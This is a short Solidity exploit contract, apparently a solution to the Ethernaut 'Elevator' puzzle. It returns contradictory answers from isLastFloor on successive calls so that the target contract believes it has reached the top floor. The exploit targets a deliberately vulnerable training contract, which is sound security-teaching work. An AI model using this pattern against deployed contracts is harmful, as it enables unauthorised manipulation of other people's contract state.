// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Hacker is Building {
    address public target;
    bool public isCaller;

    constructor(address target_) public {
        target = target_;
    }

    function isLastFloor(uint256 o) external override returns (bool) {
        if (isCaller) {
            return true;
        }
        isCaller = true;
        return false;
    }

    function attack() external {
        Elevator(target).goTo(101);
    }
}
